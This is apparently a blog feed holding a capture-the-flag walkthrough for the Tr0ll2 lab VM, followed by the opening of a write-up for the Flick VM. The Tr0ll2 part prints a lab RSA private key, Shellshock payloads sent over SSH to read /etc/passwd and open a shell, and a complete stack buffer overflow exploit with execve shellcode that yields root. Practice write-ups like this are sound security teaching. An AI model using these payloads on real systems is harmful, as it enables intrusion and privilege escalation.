<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# echo SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg== | base64 -d
ItCantReallyBeThisEasyRightLOL
[/plain]</p>

<p><img src="http://i780.photobucket.com/albums/yy82/dguy210/facepalm-star-trek-o_zps1270c857.gif" alt="" /></p>

<p>So, we&rsquo;ve exhausted the HTTP server by this point, so lets move onto FTP. I won&rsquo;t bore you with details, but the username and password combo is Tr0ll:Tr0ll. The only file residing on the FTP server is a ZIP file.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ftp 172.16.56.138
Connected to 172.16.56.138.
220 Welcome to Tr0ll FTP&hellip; Only noobs stay for a while&hellip;
Name (172.16.56.138:root): Tr0ll
331 Please specify the password.
Password: Tr0ll
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -l
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r&ndash;r&ndash;    1 0        0            1474 Oct 04 01:09 lmao.zip
226 Directory send OK.
ftp>
[/plain]</p>

<p>On extracting the ZIP file, we are asked for a password&hellip; lets try &ldquo;ItCantReallyBeThisEasyRightLOL&rdquo;</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password: ItCantReallyBeThisEasyRightLOL
  inflating: noob
[/plain]</p>

<p>which turns out to be an RSA private key - this is our route in via SSH.</p>

<p>[plain]
&mdash;&ndash;BEGIN RSA PRIVATE KEY&mdash;&ndash;
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
&mdash;&ndash;END RSA PRIVATE KEY&mdash;&ndash;
[/plain]</p>

<p>It is possible to SSH into the VM using the noob user, as per the key&rsquo;s filename, but we are immediately disconnected.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh -i key.key <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#110;&#111;&#x6f;&#98;&#x40;&#x31;&#55;&#x32;&#46;&#x31;&#54;&#46;&#53;&#x36;&#46;&#49;&#51;&#56;">&#x6e;&#111;&#x6f;&#98;&#64;&#x31;&#x37;&#50;&#46;&#x31;&#x36;&#46;&#53;&#54;&#46;&#x31;&#51;&#x38;</a>
TRY HARDER LOL!
Connection to 172.16.56.138 closed.
root@pwk:~#
[/plain]</p>

<p>Standard things here like &ndash;norc don&rsquo;t work, so lets try something new. SHELLSHOCK !</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh -i key.key <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#110;&#111;&#x6f;&#x62;&#64;&#49;&#55;&#50;&#x2e;&#49;&#54;&#46;&#x35;&#54;&#x2e;&#x31;&#51;&#x38;">&#x6e;&#111;&#x6f;&#x62;&#64;&#x31;&#x37;&#x32;&#x2e;&#49;&#x36;&#46;&#53;&#54;&#46;&#x31;&#x33;&#56;</a> &lsquo;() { :;}; cat /etc/passwd&rsquo;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
maleus:x:1000:1000:Tr0ll,,,:/home/maleus:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
<a href="ftp:x:104:111:ftp">ftp:x:104:111:ftp</a> daemon,,,:/srv/<a href="ftp:/bin/false">ftp:/bin/false</a>
noob:x:1002:1002::/home/noob:/bin/bash
Tr0ll:x:1001:1001::/home/tr0ll:/bin/false
root@pwk:~#
[/plain]</p>

<p>Yup, we can get a shell with this using &lsquo;() { :;}; /bin/bash&rsquo;</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh -i key.key <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#110;&#111;&#111;&#x62;&#64;&#x31;&#x37;&#50;&#46;&#49;&#54;&#x2e;&#x35;&#54;&#x2e;&#49;&#x33;&#x38;">&#110;&#x6f;&#x6f;&#x62;&#64;&#x31;&#x37;&#x32;&#46;&#x31;&#54;&#46;&#53;&#x36;&#46;&#49;&#51;&#56;</a> &lsquo;() { :;}; /bin/bash&rsquo;
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
[/plain]</p>

<p>A small bit of enumeration here identifies the following folder structure</p>

<p>[plain gutter=&ldquo;false&rdquo;]
pwd
/nothing_to_see_here/choose_wisely
ls -l
total 12
drwsr-xr-x 2 root root 4096 Oct  5 21:16 door1
drwsr-xr-x 2 root root 4096 Oct  5 21:19 door2
drwsr-xr-x 2 root root 4096 Oct  5 21:17 door3
[/plain]</p>

<p>Each door folder includes a file called r00t, which is a binary. However, there are 3 different versions. One of them puts you into an rbash shell for 2 minutes, one of them kicks you out and reboots the VM, and the other one (the largest one) repeats anything you provide it via stdin. These files are SUID, so, looks like we have a standard buffer overflow here.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
-rwsr-xr-x 1 root root 7273 Oct  5 21:16 r00t
-rwsr-xr-x 1 root root 8401 Oct  5 21:16 r00t
-rwsr-xr-x 1 root root 7271 Oct  5 21:17 r00t
[/plain]</p>

<p>Something to note here before we carry on - a scheduled script rotates these files, so make sure you always work on the file that is 8401 bytes large - you may have to change into a different door directory.</p>

<p>Loading the file in GDB shows that you can easily overflow it with about 300 bytes of input.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# gdb ./r00t
GNU gdb (GDB) 7.4.1-debian
Copyright &copy; 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html</a>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &ldquo;show copying&rdquo;
and &ldquo;show warranty&rdquo; for details.
This GDB was configured as &ldquo;i486-linux-gnu&rdquo;.
For bug reporting instructions, please see:
<a href="http://www.gnu.org/software/gdb/bugs/">http://www.gnu.org/software/gdb/bugs/</a>&hellip;
Reading symbols from /root/troll/r00t&hellip;done.
gdb-peda$ r $(python -c &lsquo;print &ldquo;A&rdquo;*300&rsquo;);</p>

<p>Program received signal SIGSEGV, Segmentation fault.
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0x12c
EBX: 0xb7fbeff4 &ndash;> 0x15ed7c
ECX: 0xbffff4d8 &ndash;> 0xb7fbf4e0 &ndash;> 0xfbad2a84
EDX: 0xb7fc0360 &ndash;> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 (&lsquo;AAAA&rsquo;)
ESP: 0xbffff610 (&lsquo;A&rsquo; <repeats 28 times>)
EIP: 0x41414141 (&lsquo;AAAA&rsquo;)
EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-]
Invalid $PC address: 0x41414141
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-]
0000| 0xbffff610 (&lsquo;A&rsquo; <repeats 28 times>)
0004| 0xbffff614 (&lsquo;A&rsquo; <repeats 24 times>)
0008| 0xbffff618 (&lsquo;A&rsquo; <repeats 20 times>)
0012| 0xbffff61c (&lsquo;A&rsquo; <repeats 16 times>)
0016| 0xbffff620 (&lsquo;A&rsquo; <repeats 12 times>)
0020| 0xbffff624 (&ldquo;AAAAAAAA&rdquo;)
0024| 0xbffff628 (&ldquo;AAAA&rdquo;)
0028| 0xbffff62c &ndash;> 0x8048200 &ndash;> 0x0
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
[/plain]</p>

<p>Standard buffer overflow process here (I don&rsquo;t want to teach you how to suck eggs tbh, there&rsquo;s enough resources online). EIP is at 269, so&hellip;</p>

<p>[plain gutter=&ldquo;false&rdquo;]
gdb-peda$ r $(python -c &lsquo;print &ldquo;A&rdquo;*268 + &ldquo;BBBB&rdquo;&rsquo;);</p>

<p>Program received signal SIGSEGV, Segmentation fault.
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0x110
EBX: 0xb7fbeff4 &ndash;> 0x15ed7c
ECX: 0xbffff4f8 &ndash;> 0xb7fbf4e0 &ndash;> 0xfbad2a84
EDX: 0xb7fc0360 &ndash;> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 (&lsquo;AAAA&rsquo;)
ESP: 0xbffff630 &ndash;> 0x0
EIP: 0x42424242 (&lsquo;BBBB&rsquo;)
EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-]
Invalid $PC address: 0x42424242
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-]
0000| 0xbffff630 &ndash;> 0x0
0004| 0xbffff634 &ndash;> 0xbffff6d4 &ndash;> 0xbffff7f8 (&ldquo;/root/troll/r00t&rdquo;)
0008| 0xbffff638 &ndash;> 0xbffff6e0 &ndash;> 0xbffff91a (&ldquo;SHELL=/bin/bash&rdquo;)
0012| 0xbffff63c &ndash;> 0xb7fe0860 &ndash;> 0xb7e60000 &ndash;> 0x464c457f
0016| 0xbffff640 &ndash;> 0xb7ff6821 (mov    eax,DWORD PTR [ebp-0x10])
0020| 0xbffff644 &ndash;> 0xffffffff
0024| 0xbffff648 &ndash;> 0xb7ffeff4 &ndash;> 0x1cf2c
0028| 0xbffff64c &ndash;> 0x8048278 (&ldquo;__libc_start_main&rdquo;)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$
[/plain]</p>

<p>OK, easy peasy. GDB identifies that there isn&rsquo;t a jmp esp in the binary, but it is a dynamically linked binary, so ret2libc is possible. But why make it more complicated for ourselves ? Naaah. Our shellcode can be placed in an environment value</p>

<p>[plain gutter=&ldquo;false&rdquo;]
export SHELLCODE=$(python -c &lsquo;print &ldquo;\x90&rdquo;*100 + &ldquo;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&rdquo;&rsquo;)[/plain]</p>

<p>Which can be located within GDB</p>

<p>[plain gutter=&ldquo;false&rdquo;]
gdb ./r00t
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright &copy; 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html</a>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &ldquo;show copying&rdquo;
and &ldquo;show warranty&rdquo; for details.
This GDB was configured as &ldquo;i686-linux-gnu&rdquo;.
For bug reporting instructions, please see:
<a href="http://bugs.launchpad.net/gdb-linaro/">http://bugs.launchpad.net/gdb-linaro/</a>&hellip;
Reading symbols from /nothing_to_see_here/choose_wisely/door1/r00t&hellip;done.
(gdb) break main
Breakpoint 1 at 0x8048450: file bof.c, line 7.
(gdb) run
Starting program: /nothing_to_see_here/choose_wisely/door1/r00t</p>

<p>Breakpoint 1, main (argc=1, argv=0xbffffcb4) at bof.c:7
(gdb) 7 bof.c: No such file or directory.
x/100xw $esp
0xbffffb00: 0x00000000  0x00000000  0x00000001  0x000008b0
0xbffffb10: 0x40024b48  0x40024858  0x08048278  0x40037158
0xbffffb20: 0x0804821c  0x00000001  0x400c2230  0x400c245e
0xbffffb30: 0xbffffb68  0x40020ff4  0x40021ad0  0xbffffc54
0xbffffb40: 0xbffffc10  0x40009ed9  0xbffffbf0  0x0804821c
0xbffffb50: 0xbffffbd8  0x40021a74  0x00000000  0x40024b48
0xbffffb60: 0x00000001  0x00000000  0x00000001  0x40021918
0xbffffb70: 0x00000000  0x00000000  0x00000000  0x401cfff4
0xbffffb80: 0xbffffbce  0xbffffbcf  0x00000001  0x400c27b9
0xbffffb90: 0xbffffbcf  0xbffffbce  0x00000000  0x40015fec
0xbffffba0: 0xbffffc54  0x40022000  0x00000000  0x4005cc73
0xbffffbb0: 0x08048278  0x00000000  0x00c10000  0x00000001
0xbffffbc0: 0xbffffdc2  0x0000002f  0xbffffc1c  0x401cfff4
0xbffffbd0: 0x080484b0  0x08049ff4  0x00000001  0x0804831d
0xbffffbe0: 0x401d03e4  0x0000000d  0x08049ff4  0x080484d1
0xbffffbf0: 0xffffffff  0x4005cdc6  0x401cfff4  0x4005ce55
0xbffffc00: 0x4000f280  0x00000000  0x080484b9  0x401cfff4
0xbffffc10: 0x080484b0  0x00000000  0x00000000  0x400434d3
0xbffffc20: 0x00000001  0xbffffcb4  0xbffffcbc  0x40024858
0xbffffc30: 0x00000000  0xbffffc1c  0xbffffcbc  0x00000000
0xbffffc40: 0x0804823c  0x401cfff4  0x00000000  0x00000000
0xbffffc50: 0x00000000  0xdd889bc6  0x2a19fe39  0x00000000
0xbffffc60: 0x00000000  0x00000000  0x00000001  0x08048390
0xbffffc70: 0x00000000  0x400146b0  0x400433e9  0x40020ff4
0xbffffc80: 0x00000001  0x08048390  0x00000000  0x080483b1
(gdb)
0xbffffc90: 0x08048444  0x00000001  0xbffffcb4  0x080484b0
0xbffffca0: 0x08048520  0x4000f280  0xbffffcac  0x40021918
0xbffffcb0: 0x00000001  0xbffffdc2  0x00000000  0xbffffdf0
0xbffffcc0: 0xbffffe77  0xbffffe87  0xbffffea9  0xbffffeb3
0xbffffcd0: 0xbffffebe  0xbffffed2  0xbfffff1f  0xbfffff2e
0xbffffce0: 0xbfffff5b  0xbfffff6c  0xbfffff75  0xbfffff85
0xbffffcf0: 0xbfffff8d  0xbfffff9a  0x00000000  0x00000020
0xbffffd00: 0x40022414  0x00000021  0x40022000  0x00000010
0xbffffd10: 0x0fabfbff  0x00000006  0x00001000  0x00000011
0xbffffd20: 0x00000064  0x00000003  0x08048034  0x00000004
0xbffffd30: 0x00000020  0x00000005  0x00000009  0x00000007
0xbffffd40: 0x40000000  0x00000008  0x00000000  0x00000009
0xbffffd50: 0x08048390  0x0000000b  0x000003ea  0x0000000c
0xbffffd60: 0x000003ea  0x0000000d  0x000003ea  0x0000000e
0xbffffd70: 0x000003ea  0x00000017  0x00000001  0x00000019
0xbffffd80: 0xbffffdab  0x0000001f  0xbfffffce  0x0000000f
0xbffffd90: 0xbffffdbb  0x00000000  0x00000000  0x00000000
0xbffffda0: 0x00000000  0x00000000  0xf6000000  0x6d8240c1
0xbffffdb0: 0xc85c9138  0x1f1bbf89  0x692ef87a  0x00363836
0xbffffdc0: 0x6e2f0000  0x6968746f  0x745f676e  0x65735f6f
0xbffffdd0: 0x65685f65  0x632f6572  0x736f6f68  0x69775f65
0xbffffde0: 0x796c6573  0x6f6f642f  0x722f3172  0x00743030
0xbffffdf0: 0x4c454853  0x444f434c  0x90903d45  0x90909090
0xbffffe00: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffe10: 0x90909090  0x90909090  0x90909090  0x90909090
(gdb)
[/plain]</p>

<p>Shellcode starts around 0xbffffe10, so we just change our EIP to that memory location to run the shellcode. As proven within GDB, it runs as expected and /bin/dash is executed (GDB strips EUID though)</p>

<p>[plain gutter=&ldquo;false&rdquo;]
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>268 + &ldquo;\x10\xfe\xff\xbf&rdquo;&rsquo;)
Starting program: /nothing_to_see_here/choose_wisely/door1/r00t $(python -c &lsquo;print &ldquo;A&rdquo;</em>268 + &ldquo;\x10\xfe\xff\xbf&rdquo;&rsquo;)
process 1575 is executing new program: /bin/dash
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
exit
[Inferior 1 (process 1575) exited with code 0177]
(gdb)
[/plain]</p>

<p>When run outside of GDB, we get dropped to a root shell</p>

<p>[plain gutter=&ldquo;false&rdquo;]
./r00t $(python -c &lsquo;print &ldquo;A&rdquo;*268 + &ldquo;\x10\xfe\xff\xbf&rdquo;&rsquo;)
id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
cd /root
ls -ls
total 40
4 -rw-r&ndash;r&ndash; 1 root   root     68 Oct  6 18:32 Proof.txt
4 drwxr-xr-x 5 root   root   4096 Oct  4 22:35 core1
4 drwxr-xr-x 5 root   root   4096 Oct  4 22:36 core2
4 drwxr-xr-x 5 root   root   4096 Oct  4 22:36 core3
4 drwxr-xr-x 5 root   root   4096 Oct  4 22:36 core4
4 drwxr-xr-x 2 root   root   4096 Oct  5 21:14 goal
4 drwxr-xr-x 2 root   root   4096 Oct  6 18:36 hardmode
4 -rw-r&ndash;r&ndash; 1 maleus maleus 1474 Oct  4 00:28 lmao.zip
4 -rw-r&ndash;r&ndash; 1 root   root    828 Oct  4 22:43 ran_dir.py
4 drwxr-xr-x 2 root   root   4096 Oct  6 18:35 reboot
cat Proof.txt
You win this time young Jedi&hellip;</p>

<p>a70354f0258dcc00292c72aab3c8b1e4
[/plain]</p>

<p><img src="http://cdn-media-2.lifehack.org/wp-content/files/2014/08/Getting-it-done-gif.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Many Hackers Does It Take To Change A Lightbulb ?]]></title>
    <link href="http://recrudesce.github.io/blog/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb/"/>
    <updated>2014-08-13T01:00:28+01:00</updated>
    <id>http://recrudesce.github.io/blog/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb</id>
    <content type="html"><![CDATA[<p>Whilst in the middle of cracking <a href="http://vulnhub.com/entry/xerxes-2,97/">Xerxes2</a>, <a href="https://twitter.com/leonjza">leonjza</a> decided to release <a href="http://vulnhub.com/entry/flick-1,99/">Flick</a> - a CTF that is sure to tax minds.  Naturally I decided to make myself feel like an unskilled loser, and downloaded it. Here&rsquo;s the story of how I rooted Flick first.</p>

<blockquote>root@flick:~# id
uid=0(root) gid=0(root) groups=0(root)
First ! [@leonjza](https://twitter.com/leonjza) [@VulnHub](https://twitter.com/VulnHub) [#flick](https://twitter.com/hashtag/flick?src=hash) [#boot2root](https://twitter.com/hashtag/boot2root?src=hash) [#vulnhub](https://twitter.com/hashtag/vulnhub?src=hash)
> 
> &#8211; Russ Watts (@recrudesce) [August 12, 2014](https://twitter.com/recrudesce/statuses/499168321150124033)</blockquote>




<!-- more -->


<h2>&lsquo;Avin&rsquo; a Butchers</h2>

<p>Blah blah NMAP blah ;)</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nmap -sS -O -p1-65535 -T4 192.168.0.106</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-08-08 22:39 BST
Nmap scan report for 192.168.0.106
Host is up (0.00s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 04:d0:8d:4d:ee:87:30:e7:60:82:63:d3:a8:6e:4b:ac (DSA)
|   2048 64:ec:a9:9b:0b:c0:11:d4:08:63:cf:83:e1:db:23:9a (RSA)
|_  256 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02 (ECDSA)
8881/tcp open  unknown</p>

<p>Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel[/plain]</p>

<p>SSH and a random unknown port - ominous. A quick netcat to the port presents us with a request for a password</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nc 192.168.0.106 8881
Welcome to the admin server. A correct password will &lsquo;flick&rsquo; the switch and open a new door:</p>

<blockquote><p>[/plain]</p></blockquote>

<p>Anything you type in just gets repeated back to you. I also checked for buffer overflows and format string vulns, but no avail - looks like I need a password.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
Welcome to the admin server. A correct password will &lsquo;flick&rsquo; the switch and open a new door:</p>

<blockquote><p>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
OK: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>

<p>%s%s%s%s
OK: %s%s%s%s</p>

<p>wut ?
OK: wut ?</p>

<p>[/plain]</p></blockquote>

<p><img src="http://static.fjcdn.com/gifs/MFW+someone+tries+to+open+IE.+that+makes+me+a_c3c81f_4698730.gif" alt="" /> OK, so not knowing the password, I decided to check out SSH.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#98;&#x6c;&#x61;&#104;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#x30;&#x2e;&#x31;&#x30;&#x36;">&#98;&#x6c;&#97;&#104;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x30;&#46;&#x31;&#x30;&#x36;</a></p>

<p>\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
